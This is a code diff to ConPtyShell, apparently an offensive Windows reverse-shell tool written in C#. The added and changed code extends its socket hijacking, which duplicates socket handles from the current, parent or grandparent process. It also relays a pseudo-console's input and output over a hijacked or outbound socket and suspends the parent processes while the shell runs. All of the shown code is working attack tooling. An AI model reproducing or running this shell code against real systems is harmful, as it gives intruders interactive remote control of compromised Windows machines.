@@ -389,6 +389,9 @@ public static class SocketHijacking
     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
     private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
 
+    [DllImport("Ws2_32.dll")]
+    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
+
 
     //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
@@ -713,7 +716,7 @@ public static class SocketHijacking
         return ret;
     }
 
-    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
+    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
     {
         IntPtr targetSocketHandle = IntPtr.Zero;
         List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
@@ -722,19 +725,43 @@ public static class SocketHijacking
         {
             foreach (IntPtr socketHandle in targetProcessSockets)
             {
+                // we prioritize the hijacking of Overlapped sockets
                 if (!IsSocketOverlapped(socketHandle))
                 {
-                    Console.WriteLine("Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
-                    closesocket(socketHandle);
+                    Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                     continue;
                 }
                 targetSocketHandle = socketHandle;
+                overlappedSocket = true;
                 break;
+            }
+            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
+            if (targetSocketHandle == IntPtr.Zero) {
+                Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
+                foreach (IntPtr socketHandle in targetProcessSockets)
+                {
+                    targetSocketHandle = socketHandle;
+                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
+                    break;
+                }
             }
         }
         if (targetSocketHandle == IntPtr.Zero)
-            throw new ConPtyShellException("No overlapped sockets found, so no hijackable sockets found :( Exiting...");
+            throw new ConPtyShellException("No sockets found, so no hijackable sockets :( Exiting...");
         return targetSocketHandle;
+    }
+    public static void SetSocketBlockingMode(IntPtr socket, int mode)
+    {
+        int FIONBIO = -2147195266;
+        int NonBlockingMode = 1;
+        int BlockingMode = 0;
+        int result;
+        if (mode == 1)
+            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
+        else
+            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
+        if (result == -1)
+            throw new ConPtyShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
     }
 }
 
@@ -804,6 +831,7 @@ public static class ConPtyShell
     private const int STD_INPUT_HANDLE = -10;
     private const int STD_OUTPUT_HANDLE = -11;
     private const int STD_ERROR_HANDLE = -12;
+    private const int WSAEWOULDBLOCK = 10035;
 
 
 
@@ -1014,7 +1042,8 @@ public static class ConPtyShell
         }
 
         IntPtr socket = IntPtr.Zero;
-        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
+        //socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
+        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
         SOCKADDR_IN sockinfo = new SOCKADDR_IN();
         sockinfo.sin_family = (short)2;
         sockinfo.sin_addr = inet_addr(host);
@@ -1156,7 +1185,7 @@ public static class ConPtyShell
         return processInfo;
     }
 
-    private static void ThreadReadPipeWriteSocket(object threadParams)
+    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
     {
         object[] threadParameters = (object[])threadParams;
         IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
@@ -1174,17 +1203,43 @@ public static class ConPtyShell
         // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
     }
 
-    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket)
+    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
+    {
+        object[] threadParameters = (object[])threadParams;
+        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
+        IntPtr shellSocket = (IntPtr)threadParameters[1];
+        int bufferSize = 256;
+        bool readSuccess = false;
+        Int32 bytesSent = 0;
+        uint dwBytesRead = 0;
+        do
+        {
+            byte[] bytesToWrite = new byte[bufferSize];
+            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
+            // Console.WriteLine("debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = " + dwBytesRead + " Marshal.GetLastWin32Error() " + Marshal.GetLastWin32Error());
+            do
+            {
+                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
+                // Console.WriteLine("debug ThreadReadPipeWriteSocket send: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
+            } while (WSAGetLastError() == WSAEWOULDBLOCK);
+        } while (bytesSent > 0 && readSuccess);
+    }
+
+    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
     {
         object[] threadParameters = new object[2];
         threadParameters[0] = OutputPipeRead;
         threadParameters[1] = shellSocket;
-        Thread thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocket);
+        Thread thThreadReadPipeWriteSocket;
+        if(overlappedSocket)
+            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
+        else
+            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
         thThreadReadPipeWriteSocket.Start(threadParameters);
         return thThreadReadPipeWriteSocket;
     }
 
-    private static void ThreadReadSocketWritePipe(object threadParams)
+    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
     {
         object[] threadParameters = (object[])threadParams;
         IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
@@ -1204,13 +1259,45 @@ public static class ConPtyShell
         TerminateProcess(hChildProcess, 0);
     }
 
-    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess)
+    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
+    {
+        object[] threadParameters = (object[])threadParams;
+        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
+        IntPtr shellSocket = (IntPtr)threadParameters[1];
+        IntPtr hChildProcess = (IntPtr)threadParameters[2];
+        int bufferSize = 256;
+        bool writeSuccess = false;
+        Int32 nBytesReceived = 0;
+        uint bytesWritten = 0;
+        bool socketBlockingOperation = false;
+        do
+        {
+            byte[] bytesReceived = new byte[bufferSize];
+            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
+            if (WSAGetLastError() == WSAEWOULDBLOCK)
+            {
+                socketBlockingOperation = true;
+                continue;
+            }
+            socketBlockingOperation = false;
+            // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
+            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
+            // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
+        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
+        TerminateProcess(hChildProcess, 0);
+    }
+
+    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
     {
         object[] threadParameters = new object[3];
         threadParameters[0] = InputPipeWrite;
         threadParameters[1] = shellSocket;
         threadParameters[2] = hChildProcess;
-        Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);
+        Thread thReadSocketWritePipe;
+        if(overlappedSocket)
+            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
+        else
+            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
         thReadSocketWritePipe.Start(threadParameters);
         return thReadSocketWritePipe;
     }
@@ -1230,10 +1317,13 @@ public static class ConPtyShell
         bool parentSocketInherited = false;
         bool grandParentSocketInherited = false;
         bool conptyCompatible = false;
+        bool IsSocketOverlapped = true;
         string output = "";
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
+        Thread thThreadReadPipeWriteSocket;
+        Thread thReadSocketWritePipe;
         if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
             conptyCompatible = true;
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
@@ -1252,15 +1342,15 @@ public static class ConPtyShell
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                 if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                 // try to duplicate the socket for the current process
-                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
+                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                 if (shellSocket == IntPtr.Zero && parentProcess != null)
                 {
                     // if no sockets are found in the current process we try to hijack our current parent process socket
-                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess);
+                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                     if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                     {
                         // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
-                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess);
+                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
                             throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
@@ -1339,18 +1429,29 @@ public static class ConPtyShell
         // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
+        IsSocketOverlapped = false;
+        upgradeShell = true;
+        if (upgradeShell) {
+            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
+            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
+            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
+            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
+        }
         //Threads have better performance than Tasks
-        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket);
-        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess);
-        // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
-        if (upgradeShell && parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
-        if (upgradeShell && grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
+        thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
+        thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
+        // wait for the child process until exit
         WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
+        
         //cleanup everything
-        if (upgradeShell && parentSocketInherited) NtResumeProcess(parentProcess.Handle);
-        if (upgradeShell && grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
+        if (upgradeShell)
+        {
+            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
+            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
+            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
+        }
         closesocket(shellSocket);
         RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
         if (newConsoleAllocated)
